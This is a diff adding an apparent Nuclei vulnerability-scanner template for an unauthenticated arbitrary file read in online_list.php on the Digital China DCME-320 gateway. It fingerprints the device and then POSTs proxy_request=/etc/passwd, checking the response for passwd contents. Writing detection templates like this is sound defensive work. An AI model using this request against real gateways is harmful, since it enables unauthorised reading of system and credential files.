@@ -1,0 +1,52 @@
+id: digitalchina-dcme-320-eg-online-list-php-anyfile-read
+info:
+  name: Arbitrary File Read in 神州数码 DCME-320出口网关 (online_list.php)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,arbitrary-file-read
+  description: |
+    神州数码 DCME-320出口网关 contains a vulnerability in online_list.php that allows unauthenticated file read. This can be exploited by sending a crafted request.
+
+variables:
+  file_path: "/etc/passwd"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "style/blue/css/dcn_ui.css"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        POST /function/auth/user/online_list.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        proxy_request={{file_path}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root"
+          - "/bin"
+        condition: and
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: status
+        status:
+          - 200
